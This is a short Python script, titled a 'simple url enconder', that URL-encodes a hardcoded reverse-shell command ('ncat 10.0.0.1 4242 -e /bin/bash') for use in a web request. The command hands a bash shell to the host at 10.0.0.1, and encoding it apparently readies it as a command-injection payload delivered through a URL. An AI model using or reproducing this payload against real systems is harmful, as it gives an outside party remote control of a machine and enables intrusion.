#simple url enconder

import urllib.request as req
string = 'ncat 10.0.0.1 4242 -e /bin/bash'
print (req.pathname2url(string))

